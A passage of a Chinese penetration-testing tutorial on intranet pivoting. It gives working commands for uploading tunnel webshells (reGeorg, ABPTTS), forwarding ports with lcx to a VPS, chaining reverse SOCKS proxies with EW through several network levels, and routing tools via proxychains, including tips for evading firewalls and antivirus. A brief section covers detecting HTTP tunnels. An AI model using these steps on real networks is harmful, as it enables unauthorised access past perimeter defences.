+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a61717;background-color:#e3d2d2">CONNECT 124.xxx.xxx.xx:443 HTTP/1.1 //建立http隧道要443端口
+</span><span style="color:#a61717;background-color:#e3d2d2">Proxy-Connection: Keep-Alive   //客户端到服务器端的连接持续有效
+</span><span style="color:#a61717;background-color:#e3d2d2">Content-Length: 0
+</span><span style="color:#a61717;background-color:#e3d2d2">Host: 124.xxx.xxx.xx   //主机地址
+</span><span style="color:#a61717;background-color:#e3d2d2">Proxy-Authorization:Basic YTph //身份验证信息
+</span><span style="color:#a61717;background-color:#e3d2d2">User-Agent: OpenFetion //可以标识请求者的信息,如什么浏览器类型和版本、操作系统、使用语言等信息
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>场景</strong></p>
+<ol>
+<li>
+<p><strong>内网防火墙具有协议检测和识别能力且仅允许HTTP流量出去外网</strong></p>
+</li>
+<li>
+<p><strong>内网具备深度包检测能力且仅允许HTTP流量出去外网但可以检测明文传输的HTTP流量</strong></p>
+</li>
+<li>
+<p><strong>服务器处于内网，可以访问外部网络</strong></p>
+</li>
+<li>
+<p><a href="https://github.com/nccgroup/ABPTTS">abptts</a></p>
+</li>
+</ol>
+<p>基于SSL加密的隧道工具，全程通信数据加密，一定程度上能对抗取证检测</p>
+<p>需要<code>pycrypto、httplib2</code>依赖库，然后生成服务端webshell</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python abpttsfactory.py -o webshell
+</code></pre></td></tr></table>
+</div>
+</div><p>生成了<code>aspx、jsp、war</code>三种类型的webshell（不支持PHP），然后上传至网站服务器即可。然后就可以绑定端口建立隧道了</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python abpttsclient.py -c webshell/config.txt -u <span style="color:#d14">&#34;http://192.168.1.161:8001/abptts.aspx&#34;</span> -f 127.0.0.1:1234/192.168.1.161:3389
+
+-c 指定webshell配置文件
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/04/15/5cb42fb36f344.png" alt="img"></p>
+<ol>
+<li><a href="https://github.com/sensepost/reGeorg">reGeorg</a></li>
+</ol>
+<p>这个可以说是用的比较多了，支持<code>php|aspx|ashx|jsp</code>，与上一个abptts类似，也是上传一个<code>Tunnel</code>脚本，然后远程连接转发端口即可建立socket代理隧道</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python2 reGeorgSocksProxy.py -p <span style="color:#099">8080</span> -l 192.168.1.139 -u http://192.168.1.161:8001/tunnel.aspx
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/04/15/5cb42fc816fb3.png" alt="img"></p>
+<p>【注】</p>
+<ol>
+<li>对于aspx的网站假如总是报错，可以尝试ashx脚本</li>
+<li>PHP程序确认php.ini中socket模块正常开启并且可用，reGeorge也提供了nosocket脚本</li>
+<li>linux下利用<code>proxychains</code>，Windows下利用<code>proxifier</code>实现任意应用通过代理</li>
+<li>假如绑定某些端口会遇到socket无法建立连接时，尝试着利用80、53等穿透性强的端口</li>
+</ol>
+<p>剩下还有一些bridge、Reduh、Tunna等工具可以建立HTTP隧道，但是效果都不大好&hellip;.</p>
+<ol>
+<li>Navicat</li>
+</ol>
+<p>Navicat自带对应数据库的代理脚本（mysql、postgresql、sqlite），上传该代理脚本，建立HTTP隧道，在远程机器上可直接通过Navicat连接内网数据库</p>
+<p><strong>场景</strong></p>
+<p>目标机器站库分离，数据库在内网的某台机器上；防火墙阻断外部IP访问内部数据库端口；无法开启mysql外联&hellip;</p>
+<p><img src="https://i.loli.net/2019/04/15/5cb42fd867abc.png" alt="img"></p>
+<p><strong>检测</strong></p>
+<ol>
+<li>基于签名的检测，通过检测HTTP协议数据包中特定的数据式样来判断是否是可以的HTTP数据包</li>
+<li>基于协议的检测，很多HTTP隧道传输时只是简单的一个HTTP协议封装，加上了一个HTTP头部，而正常的HTTP协议是非常复杂的</li>
+<li>基于行为的检测，通过数据包大小、数量、会话时长等，基于这些特征采取数据挖掘技术对其进行建模检测</li>
+</ol>
+<h2 id="socks代理">Socks代理</h2>
+<p>Socks是一种代理服务，可以简单地将一端的系统连接到另外一端，并且支持多种协议，包括http、ftp请求及其他类型的请求。</p>
+<p>有socks4和5两种类型，socks4只支持TCP协议而socks 5支持TCP/UDP协议，还支持各种身份认证机制等协议</p>
+<h3 id="lcx">Lcx</h3>
+<p>最为经典而且也是最为频繁的端口转发工具，是一个基于socket套接字实现的端口转发工具，从linux下的htran移植给Windows的。</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">比如要转发目标机器10.48.128.25的3389端口<span style="color:#a61717;background-color:#e3d2d2">：</span>
+
+在目标机器10.48.128.25上执行
+
+lcx.exe <span style="color:#a61717;background-color:#e3d2d2">–</span>slave 139.XXX.XX.113 9000 10.48.128.25 3389
+
+此段命令意思是将目标机器3389端口的所有数据都转发到公网VPS的9000端口上<span style="color:#a61717;background-color:#e3d2d2">。</span>
+
+在VPS上执行
+lcx.exe <span style="color:#a61717;background-color:#e3d2d2">–</span>listen 9000 5555
+
+此段命令意思是将本机9000端口上监听到的所有数据转发到本机的5555端口上<span style="color:#a61717;background-color:#e3d2d2">。</span>
+
+在PC机上用mstsc登陆139.XXX.XX.113<span style="color:#a61717;background-color:#e3d2d2">:</span>5555或者在VPS上用mstsc登陆127.0.0.1<span style="color:#a61717;background-color:#e3d2d2">:</span>5555<span style="color:#a61717;background-color:#e3d2d2">。</span>即可访问右侧内部网络中10.48.128.25服务器的3389端口<span style="color:#a61717;background-color:#e3d2d2">。</span>
+
+Lcx工具实现的是一对一的端口转发<span style="color:#a61717;background-color:#e3d2d2">，</span>如果想访问网络中列出的所有端口<span style="color:#a61717;background-color:#e3d2d2">，</span>就必须一次次的重复lcx的转发过程<span style="color:#a61717;background-color:#e3d2d2">，</span>效率相当低下<span style="color:#a61717;background-color:#e3d2d2">。</span>而且服务器都是有装有杀毒软件的<span style="color:#a61717;background-color:#e3d2d2">，</span>即使有做免杀也不能保证绕过所有的杀毒<span style="color:#a61717;background-color:#e3d2d2">。</span>
+
+像这种情况就可以用到socks代理<span style="color:#a61717;background-color:#e3d2d2">，</span>在10.48.128.25这台既能连接互联网又能连接内网的WEB服务器上架设代理<span style="color:#a61717;background-color:#e3d2d2">。</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="ew">EW</h3>
+<p>提供五种管道：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">ssocksd :   正向代理
+rssocks :   反向代理
+lcx_slave：  该管道一侧通过反弹方式连接代理请求，另一侧连接代理提供主机
+lcx_tran :   该管道通过监听本地端口代理请求，并转发给代理提供主机
+lcx_listen : 该管道通过监听本地端口接收数据，并将其转发给目标网络回连的代理提供主机
+</code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>正向socks5代理</li>
+</ol>
+<p>适用于目标机器拥有一个外网IP</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ew_for_win32.exe -s ssocksd -l 8888
+
+上述命令架设了一个端口为888，SOCKS的代理。然后使用sockscap64添加这个IP的代理就可以使用了。比较简单就不演示了。
+</code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>反弹socks5代理</li>
+</ol>
+<p>适用于目标机器没有公网IP，但可访问内网资源</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#公网机器 把1080端口的代理请求转发给8888端口</span>
+ew_for_win32.exe -s rcsocks -l <span style="color:#099">1080</span> -e 8888
+
+<span style="color:#998;font-style:italic">#内网机器 开启socks5代理并反弹到公网机器的8888端口</span>
+ew_for_win32.exe -s rssocks -d 192.168.1.175 -e 8888
+</code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>二级网络环境 （一）</li>
+</ol>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#A主机存在双网卡，外网IP，可连接目标网络内主机B</span>
+<span style="color:#998;font-style:italic">#B主机不能访问外网，能连接A</span>
+
+<span style="color:#998;font-style:italic">#B先启动socks代理</span>
+ew_for_win32.exe -s ssocksd -l 8888
+
+<span style="color:#998;font-style:italic">#A 将1080收到的代理请求转发给B的8888端口</span>
+ew_for_win32.exe -s lcx_tran -l <span style="color:#099">1080</span> -f 192.168.99.101 -g 8888
+</code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>二级网络环境 （二）</li>
+</ol>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#A主机存在双网卡，内网IP，可连接目标网络内主机B和外网</span>
+<span style="color:#998;font-style:italic">#B主机不能访问外网，能连接A</span>
+
+<span style="color:#998;font-style:italic">#VPS下 将8899收到的代理请求转交给反连8888的主机</span>
+ew_for_win32.exe -s lcx_listen -l <span style="color:#099">8899</span> -e 8888
+
+<span style="color:#998;font-style:italic">#B主机下 开启9999端口的socks代理</span>
+ew_for_win32.exe -s ssocksd -l 9999
+
+<span style="color:#998;font-style:italic">#A主机下 将公网的8888和内网B的9999连接起来</span>
+ew_for_win32.exe -s lcx_slave -d vpsIP -e <span style="color:#099">8888</span> -f 192.168.99.101 -g 9999
+</code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>三级网络环境</li>
+</ol>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#A没有公网IP但是可以访问外网，B不能访问外网但是可以被A主机访问、C可以被B访问而且能访问核心区域</span>
+
+<span style="color:#998;font-style:italic">#VPS</span> 
+ew_for_win32.exe -s rcsocks -l <span style="color:#099">1080</span> -e 8888
+
+<span style="color:#998;font-style:italic">#A主机 将VPS的8888与B主机的9999的端口连接起来</span>
+ew_for_win32.exe -s lcx_slave -d VPSIP -e <span style="color:#099">8888</span> -f BIP -g 9999
+
+<span style="color:#998;font-style:italic">#B主机 将9999收到的代理请求转发给7777端口</span>
+ew_for_win32.exe -s lcx_listen -l <span style="color:#099">9999</span> -e 7777
+
+<span style="color:#998;font-style:italic">#C主机 启动socks服务，并反弹到B主机的7777端口</span>
+ew_for_win32.exe -s rssocks -d BIP -e 7777
+
+socks -&gt; <span style="color:#099">1080</span> -&gt; <span style="color:#099">8888</span> -&gt; <span style="color:#099">9999</span> -&gt; <span style="color:#099">7777</span> -&gt; rssocks
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="内网漫游">内网漫游</h2>
+<h3 id="1windows下使用sockscap64"><strong>1.Windows下使用sockscap64</strong></h3>
+<p>首先下载安装好SocksCap64后，以管理员权限打开。默认浏览器已经添加。</p>
+<p>使用比较简单，点击代理，点击添加一个代理，然后设置下代理服务器IP和端口就可以使用了。设置好后可以点击软件右边有个闪电的小圆点，测试下当前代理服务器是否可以连接，如下图，连接是正常的。</p>
+<p>这个时候就可以选择浏览器，右击在代理隧道中运行选中的程序，然后我们就可以自由访问我们想访问的内网资源了，比如我们可以访问10.48.128.22路由的80端口。</p>
+<p>可以看到我们已经成功的通过socks代理漫游内部网络WEB资源，我们接着看看还有哪些程序能够利用SOCKSCAP的程序通过代理访问内网中的哪些端口了？</p>
+<p>尝试登陆10.48.128.20的3389端口，可以看到成功登陆。</p>
+<p>我们可以在我们的公网VPS的命令行下可以看到，不停的有数据的交换。再尝试PUTTY访问10.48.128.49的22端口，成功登陆。</p>
+<p>再试试VNC端口，因为10.48.128.25开了5900端口，OK，成功访问。大家可以看到这种利用SOCKS代理实现一对多端口映射的优势立刻就体现了出来，效率倍增。</p>
+<p>但是将扫描工具进行SOCKSCAP代理，然后对内网网段进行扫描，我没有尝试成功，大家可以多多的尝试各种工具!我在代理下用扫描工具一般都是用proxychains，大家接着往下看！</p>
+<h3 id="2linux下使用proxychains"><strong>2.LINUX下使用proxychains</strong></h3>
+<p>KALI系统已经预装好了这个工具，我们稍作配置就可以使用，打开终端，输入命令：</p>
+<p><code>vi /etc/proxychains.conf</code></p>
+<p>顺便补充下Linux下Vim编辑器简单使用方法</p>
+<p>使用上面命令进入文本后，按“i”键就进入了编辑模式，可以对文本进行修改，修改完后按esc 然后按住shift+； 左下角会出现一个冒号这个时候输入wq，按回车保存并退出。</p>
+<p>第一步先删掉dynamic_chain前面的注释符（也就是#符号）</p>
+<p>然后拉到最下面，把默认是socks4 127.0.0.1 9050 的地方改成我们架设的代理服务139.XXX.XX.113 1008</p>
+<p>这样就设置完成了，我们接着测试下代理服务是否正常，在终端输入：</p>
+<pre><code>proxyresolv www.baidu.com
+
+cp /usr/lib/proxychains3/proxyresolv /usr/bin/
+</code></pre><p>然后再次测试下代理服务器是否正常，显示OK就表示配置正确了。</p>
+<p>现在我们就可以愉快的畅游内网了，照例先访问内网网站试试看，我们先在终端输入proxychains firefox启动火狐浏览器。</p>
+<p>等个几秒钟，火狐就打开了，我们还是访问10.48.128.22路由的80端口看看。</p>
+<p>顺利打开，可以看到kali里面的数据不停的交换，我们再打开10.48.128.48看看，也是可以访问的，一个Zend服务器测试页。</p>
+<p>接着就到了看自由发挥了！！！</p>
+<h3 id="3regeorgproxifier组合技"><strong>3.reGeorg+Proxifier组合技</strong></h3>
+<p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，而Proxifier是一款强大的socks5客户端，可以让不支持通过代理服务器工作的网络能通过HTTPS或SOCKS代理或代理链。该文件下支持php，asp，jsp，aspx。</p>
+<p>内网转发工具大体分为：端口转发工具(lcx.exe)，Web代理脚本，Shell反弹脚本等。</p>
+<p>reGeorg的出现，方便了安全测试代理进入内网，现在使用reGeorg和Proxifier，在安全测试过程中，可以利用他们的组合完成从外网到内网的通信。</p>
+<p><strong>正向代理和反向代理：</strong></p>
+<p>1.正向代理：正向代理类似一个跳板机，代理访问内部资源。</p>
+<p>举个例子：我是一个用户，我访问不了某网站，但是我能访问一个代理服务器，这个代理服务器能访问那个我不能访问的网站，于是我先连上代理服务器，告诉他我需要那个无法访问网站的内容，代理服务器去取回来，然后返回给我。从网站的角度，只在代理服务器来取内容的时候有一次记录，有时候并不知道是用户的请求，也隐藏了用户的资料，这取决于代理告不告诉网站。</p>
+<p><strong>客户端必须设置正向代理服务器，前提是要知道正向代理服务器的IP地址，还有代理程序的端口。</strong></p>
+<p>总结：正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。</p>
+<p>正向代理用途：</p>
+<p>(1) 访问原来无法访问的资源，如Google，youtube</p>
+<p>(2) 可以做缓存，加速访问资源。</p>
+<p>(3) 对客户端访问授权，上网进行认证。</p>
+<p>(4) 记录用户访问记录，管理上网行为，对外隐藏用户信息。</p>
+<p>2.反向代理：</p>
+<p>反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p>
+<p>反向代理作用：</p>
+<p>(1) 保证内网的安全，可以使用反向代理提供WAF功能，阻止web攻击大型网站，通常将反向代理作为公网访问地址，Web服务器是内网。</p>
+<p>(2) 负载均衡，通过反向代理服务器来优化网站的负载</p>
+<p>即是正向代理隐藏的是客户端，反向代理隐藏的是服务器端</p>
+<p><strong>内网渗透代理工具reGeorg+Proxifier工具利用场景：</strong></p>
+<p>目标环境：linux服务器受到防火墙的限制，防火墙DMZ区域映射外网端口80，外网只能通过80端口访问内网，内网只能返回http的流量，无法采用反向代理的形式。利用常规的lcx等反弹工具也会被各种安全软件拦截，只要一枚权限较低的webshell，尝试提权无果。</p>
+<p>为什么需要内网穿透：一般来说，linux提权需要获取一个反弹回来的半交互式shell，内网穿透可以用来进一步内网渗透。</p>
+<p>如何进行内网穿透：</p>
+<p>(1) 反向代理：将内网的流量转发到外网</p>
+<p>(2) 正向代理：以某台机器为跳板，做正向代理进行内网穿透</p>
+<p>这里很明显，我们只能通过80端口访问目标机器。因此需要借助webshell搭建一个正向代理。</p>
+<p>这个时候就需要一款内网代理和端口转发工具，穿越防火墙的阻挡直连内网</p>
+<p><strong>0x01 下载和配置reGeorg</strong></p>
+<p>由于reGeorg是用python2脚本编写，需要urllib3模块。</p>
+<p>给出reGeorg的github下载地址：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<p>使用reGeorg需要安装setuptools。</p>
+<p>windows下载地址：<a href="https://pypi.org/project/setuptools/#windows-simplified">https://pypi.org/project/setuptools/#windows-simplified</a></p>
+<p>linux下载地址：<a href="https://bootstrap.pypa.io/ez_setup.py">https://bootstrap.pypa.io/ez_setup.py</a></p>
+<p>下载完成后将setuptools复制到python2.7版本安装目录下，打开cmd，依次运行：</p>
+<pre><code>py -2 setup.py build
+py -2 setup.py install
+</code></pre><p>使用pip直接安装urllib3:</p>
+<pre><code>py -2 -m pip install urllib3
+</code></pre><p>至此reGeorg的基本使用环境已经配置完成&hellip;</p>
+<p>验证reGeorg是否可以正常运行：</p>
+<pre><code>py -2 reGeorg SocksProxy.py -h
+</code></pre><p>成功。至此reGeorg安装完成。</p>
+<p><strong>0x02 reGeorg的使用</strong></p>
+<p>将reGeorg对应的脚本上传到服务器端，reGeorg提供了php，aspx，jsp脚本</p>
+<p>直接访问上传的脚本文件，出现 Georg says, &lsquo;All seems fine&rsquo; ，表示脚本运行正常。</p>
+<p>运行reGerog监听9999端口：</p>
+<pre><code>py -2 reGeorgSocksProxy.py -p 9999 -u http://ip/tunnel.nosocket.php
+</code></pre><p>由于是基于socks5，本地还需要一个socks5代理工具，比如proxifier，proxycap&hellip;这里用proxifier为例，首先对proxifier进行配置。</p>
